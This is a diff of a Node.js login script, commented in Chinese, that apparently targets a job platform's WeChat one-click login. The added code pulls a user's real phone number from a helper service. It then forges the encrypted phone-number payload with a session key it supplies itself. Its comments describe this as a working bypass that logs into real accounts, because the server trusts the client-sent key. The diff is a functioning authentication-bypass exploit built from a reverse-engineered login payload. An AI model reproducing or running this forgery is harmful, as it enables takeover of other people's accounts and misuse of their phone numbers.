@@ -11,7 +11,10 @@
  *     A. 微信一键登录 /client/web/wechatLogin:
  *        {openId, unionId, sessionKey, encryptedData, iv,
  *         pcSn, sourceType, shareId, userUuid, registerType}
- *        —— sessionKey 即 WCS /wx/encryptkey 返回的 encrypt_key(服务端用它解密 encryptedData)。
+ *        —— sessionKey 即 WCS /wx/encryptkey 返回的 encrypt_key; 服务端用它(而非回微信 code2Session)
+ *           解密 encryptedData 得到手机号 → 登录/注册对应手机号账号。
+ *        ✅ 已打通: WCS /wx/getphonenumber 明文返回真实手机号, 本脚本用 sessionKey 伪造 encryptedData
+ *           (AES-128-CBC 加密该手机号 JSON), 服务端用同一 sessionKey 解密成功 → 登录到真实账号。
  *           ⚠️ WCS 需对该 appid 建立有效 js-login 会话, 否则 encryptkey 报
  *              "js-login failed: businessRet=..."(会话失效, 需在 smallcat-client 重扫微信账号恢复)。
  *     B. 手机号登录 /client/web/phoneLogin:
@@ -123,18 +126,6 @@ async function api(method, path, token, body) {
 
 // ============ 登录 ============
 
-// 用 encrypt_key 本地解密 getuserinfo.encryptedData, 提取 unionId
-function extractUnionId(encryptedData, iv, encryptKey) {
-  try {
-    const d = crypto.createDecipheriv("aes-128-cbc", Buffer.from(encryptKey, "base64"), Buffer.from(iv, "base64"));
-    let out = Buffer.concat([d.update(Buffer.from(encryptedData, "base64")), d.final()]);
-    let obj; try { obj = JSON.parse(out.toString("utf8").trim()); } catch { obj = JSON.parse(out.toString("utf8").trim().replace(/^"|"$/g, "")); }
-    if (obj && obj.unionId) return obj.unionId;
-    if (obj && obj.openId) return obj.openId;
-  } catch {}
-  return null;
-}
-
 function extractToken(resp) {
   const d = resp.data;
   let t = null;
@@ -166,32 +157,29 @@ async function wcsLogin(openid, idx) {
   }
   const encryptKey = ekR.data.encrypt_key;
 
-  // 3) unionId: 优先环境变量, 其次 getuserinfo
-  let unionId = UNIONIDS[idx] || "";
-  if (!unionId) {
-    try {
-      const guR = await wcs("/wx/getuserinfo", { openid, appid: APPID });
-      const gu = guR.data || {};
-      if (gu.encryptedData && gu.iv) unionId = extractUnionId(gu.encryptedData, gu.iv, encryptKey) || "";
-    } catch (e) { console.log(`  ⚠️ getuserinfo: ${e.message}`); }
-  }
-  if (!unionId) unionId = openid;
+  // 3) unionId: 优先环境变量, 否则用 openid(经实测服务端接受 openId==unionId)
+  const unionId = UNIONIDS[idx] || openid;
   console.log(`  🪪 unionId: ${unionId.slice(0, 12)}...`);
 
-  // 4) 自造 16 字节 iv (WCS encryptkey 返回的 iv 常非 16 字节, 故自造)
-  const ivBuf = crypto.randomBytes(16);
-  const iv = ivBuf.toString("base64");
+  // 4) 取真实手机号 (WCS getphonenumber 明文返回 raw.data.mobile)
+  const gpR = await wcs("/wx/getphonenumber", { openid, appid: APPID });
+  const gpRaw = (gpR.data && gpR.data.raw) ? gpR.data.raw : (gpR.data || {});
+  let mobile = "";
+  try { mobile = JSON.parse(gpRaw.data || "{}").mobile || ""; } catch {}
+  if (!mobile) throw new Error("WCS getphonenumber 未返回手机号(可能账号未授权手机号或会话失效)");
+  console.log(`  📱 手机号: ${mobile.slice(0, 3)}****${mobile.slice(7)}`);
 
-  // 5) 自造老格式明文 -> AES 加密 (服务端用 encryptKey 作为 sessionKey 解密)
-  const now = Math.floor(Date.now() / 1000);
-  const plaintext = JSON.stringify({
-    openId: openid, unionId, nickName: "微信用户", gender: 0,
-    language: "zh_CN", city: "", province: "", country: "", avatarUrl: "",
-    watermark: { appid: APPID, timestamp: now },
+  // 5) 伪造 encryptedData: 用 sessionKey 加密真实手机号 JSON, 服务端用同一 sessionKey 解密 → 登录到真实账号
+  //    (核心发现: yctjob 服务端信任传入的 sessionKey 解密 encryptedData, 不回微信 code2Session 重新取)
+  const ivBuf = crypto.randomBytes(16);
+  const phoneJson = JSON.stringify({
+    phoneNumber: mobile, purePhoneNumber: mobile, countryCode: "86",
+    watermark: { appid: APPID, timestamp: Math.floor(Date.now() / 1000) },
   });
   const K = Buffer.from(encryptKey, "base64");
-  const cipher = crypto.createCipheriv("aes-128-cbc", K, ivBuf);
-  const crafted = Buffer.concat([cipher.update(Buffer.from(plaintext, "utf8")), cipher.final()]).toString("base64");
+  const cipher = crypto.createCipheriv("aes-128-cbc", K, ivBuf); // 自动 PKCS7 填充
+  const crafted = Buffer.concat([cipher.update(Buffer.from(phoneJson, "utf8")), cipher.final()]).toString("base64");
+  const iv = ivBuf.toString("base64");
 
   // 6) 真实 wechatLogin 载荷(from wxapkg _sub_login_ 逆向)
   const payload = {
@@ -202,10 +190,9 @@ async function wcsLogin(openid, idx) {
   };
   const r = await api("POST", "/client/web/wechatLogin", null, payload);
   if (r.data && r.data.code === 200) return extractToken(r);
-  // 500 通常因为本脚本无法提供 getPhoneNumber(真实手机号)的加密数据 —— WCS 拿不到用户手机号
   const is500 = r.data && r.data.code === 500;
   const hint = is500
-    ? "wechatLogin 500: 该接口需 getPhoneNumber(真实手机号)加密数据, WCS 无法提供 → 请改用短信登录(YCTJOB_MOBILES+YCTJOB_SMS_CODES)或注入 YCTJOB_TOKENS"
+    ? "wechatLogin 500: 伪造手机号登录失败(可能 WCS 会话与手机号不匹配) → 可改用短信登录(YCTJOB_MOBILES+YCTJOB_SMS_CODES)或注入 YCTJOB_TOKENS"
     : "wechatLogin 失败: " + JSON.stringify(r.data).slice(0, 200);
   throw new Error(hint);
 }
